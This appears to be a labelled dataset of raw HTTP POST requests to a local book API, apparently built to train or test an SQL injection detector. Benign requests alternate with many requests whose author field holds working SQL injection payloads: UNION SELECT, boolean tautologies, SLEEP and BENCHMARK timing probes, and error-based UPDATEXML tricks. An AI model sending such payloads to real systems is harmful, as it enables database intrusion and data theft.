106,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo43"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
107,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 149		{""name"":""Hackathon-Demo44"",""author"":""Ramesh(UPDATEXML(3615,CONCAT(0x2e,0x717a786271,(SELECT (ELT(3615=3615,1))),0x7176767871),5839))"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
108,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo45"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
109,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 103		{""name"":""Hackathon-Demo46"",""author"":""Ramesh-1011)) OR (1891=4226)*4226 AND ((9752=9752"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
110,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo47"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
111,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 388		{""name"":""Hackathon-Demo48"",""author"":""Ramesh-1012 UNION ALL SELECT 3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
112,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo49"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
113,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 87		{""name"":""Hackathon-Demo50"",""author"":""Ramesh-1012))) OR 7241=4523\u0016"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
114,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo51"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
115,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo52"",""author"":""Ramesh1960 OR ELT(2187=4030,4030)# jqpa"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
116,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo53"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
117,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 110		{""name"":""Hackathon-Demo54"",""author"":""Ramesh-1961')) OR ELT(8504=1300,1300) AND (('ofRR'='ofRR"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
118,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo55"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
119,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 88		{""name"":""Hackathon-Demo56"",""author"":""Ramesh-1969%') OR 1943=1943-- dJSs"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
120,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo57"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
121,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 96		{""name"":""Hackathon-Demo58"",""author"":""Ramesh-1969%'))) OR 3191=4443 AND ((('%'='"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
122,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo59"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
123,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 87		{""name"":""Hackathon-Demo60"",""author"":""Ramesh-1976"") OR 7547=7547-- mTUA"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
124,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo61"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
125,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 80		{""name"":""Hackathon-Demo62"",""author"":""Ramesh-1983' OR 1598=4389#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
126,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 260		{""name"":""Hackathon-Demo0"",""author"":""RameshAND ROW(4115,7844)>(SELECT COUNT(*),CONCAT(0x717a786271,(SELECT (ELT(4115=4115,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM (SELECT 9757 UNION SELECT 8982 UNION SELECT 5308 UNION SELECT 5233)a GROUP BY x)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
127,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo1"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
128,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 72		{""name"":""Hackathon-Demo2"",""author"":""Ramesh AND SLEEP(5)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
129,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo3"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
130,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 73		{""name"":""Hackathon-Demo4"",""author"":""Ramesh AND SLEEP(5)#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
131,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo5"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
132,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 149		{""name"":""Hackathon-Demo6"",""author"":""Ramesh PROCEDURE ANALYSE(EXTRACTVALUE(3695,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x50477a4b))))),1)"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
133,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo7"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
134,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 82		{""name"":""Hackathon-Demo8"",""author"":""Ramesh UNION ALL SELECT NULL#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
135,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 61		{""name"":""Hackathon-Demo9"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
136,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo10"",""author"":""Ramesh %""))) AND 1868=7345 AND (((""%""="""",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
137,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo11"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
138,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 92		{""name"":""Hackathon-Demo12"",""author"":""Ramesh%""))) AND 3428=3428 AND (((""%""="""",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
139,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo13"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
140,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 82		{""name"":""Hackathon-Demo14"",""author"":""Ramesh' AND 2353=8039-- HKuw"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
141,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo15"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
142,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 92		{""name"":""Hackathon-Demo16"",""author"":""Ramesh' AND 3428=3428 AND 'UXQG'='UXQG"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
143,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo17"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
144,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 97		{""name"":""Hackathon-Demo18"",""author"":""Ramesh' AND 3428=3428 AND 'XXPS' LIKE 'XXPS"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
145,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo19"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
146,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 82		{""name"":""Hackathon-Demo20"",""author"":""Ramesh' AND 3428=3428-- jSyW"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
147,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo21"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
148,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 97		{""name"":""Hackathon-Demo22"",""author"":""Ramesh' AND 4786=4963 AND 'IIVq' LIKE 'IIVq"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
149,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo23"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
150,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 92		{""name"":""Hackathon-Demo24"",""author"":""Ramesh' AND 5103=4169 AND 'CEYB'='CEYB"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
151,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo25"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
152,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo26"",""author"":""Ramesh' IN BOOLEAN MODE) AND 3428=3428#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
153,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo27"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
154,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo28"",""author"":""Ramesh' IN BOOLEAN MODE) AND 4810=4637#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
155,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo29"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
156,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 98		{""name"":""Hackathon-Demo30"",""author"":""Ramesh' WHERE 4925=4925 AND 1281=7105-- OCdK"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
157,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo31"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
158,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 98		{""name"":""Hackathon-Demo32"",""author"":""Ramesh' WHERE 5527=5527 AND 3428=3428-- QxBN"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
159,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo33"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
160,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 94		{""name"":""Hackathon-Demo34"",""author"":""Ramesh') AND 3428=3428 AND ('QGry'='QGry"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
161,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo35"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
162,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 99		{""name"":""Hackathon-Demo36"",""author"":""Ramesh') AND 3428=3428 AND ('aSyd' LIKE 'aSyd"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
163,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo37"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
164,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 83		{""name"":""Hackathon-Demo38"",""author"":""Ramesh') AND 3428=3428-- gvQa"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
165,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo39"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
166,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 99		{""name"":""Hackathon-Demo40"",""author"":""Ramesh') AND 6605=1377 AND ('JIdw' LIKE 'JIdw"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
167,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo41"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
168,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 129		{""name"":""Hackathon-Demo42"",""author"":""RameshSELECT CONCAT(0x717a786271,(SELECT (ELT(9500=9500,1))),0x7176767871))"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
169,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo43"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
170,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 149		{""name"":""Hackathon-Demo44"",""author"":""Ramesh(UPDATEXML(3615,CONCAT(0x2e,0x717a786271,(SELECT (ELT(3615=3615,1))),0x7176767871),5839))"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
171,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo45"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
172,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 103		{""name"":""Hackathon-Demo46"",""author"":""Ramesh-1011)) OR (1891=4226)*4226 AND ((9752=9752"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
173,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo47"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
174,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 388		{""name"":""Hackathon-Demo48"",""author"":""Ramesh-1012 UNION ALL SELECT 3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447,3447#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
175,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo49"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
176,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 87		{""name"":""Hackathon-Demo50"",""author"":""Ramesh-1012))) OR 7241=4523\u0016"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
177,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo51"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
178,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 93		{""name"":""Hackathon-Demo52"",""author"":""Ramesh1960 OR ELT(2187=4030,4030)# jqpa"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
179,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo53"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
180,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 110		{""name"":""Hackathon-Demo54"",""author"":""Ramesh-1961')) OR ELT(8504=1300,1300) AND (('ofRR'='ofRR"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
181,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo55"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
182,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 88		{""name"":""Hackathon-Demo56"",""author"":""Ramesh-1969%') OR 1943=1943-- dJSs"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
183,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo57"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
184,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 96		{""name"":""Hackathon-Demo58"",""author"":""Ramesh-1969%'))) OR 3191=4443 AND ((('%'='"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
185,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo59"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
186,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 87		{""name"":""Hackathon-Demo60"",""author"":""Ramesh-1976"") OR 7547=7547-- mTUA"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
187,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 62		{""name"":""Hackathon-Demo61"",""author"":""Ramesh-P"",""price"":""9.99""}[!http]",VALID-REQUEST
188,"POST /books HTTP/1.1	User-Agent: curl/7.29.0	Host: localhost:8080	Accept: */*	Content-type:application/json	Content-Length: 80		{""name"":""Hackathon-Demo62"",""author"":""Ramesh-1983' OR 1598=4389#"",""price"":""9.99""}[!http]",SQL-INJECTION ATTACK
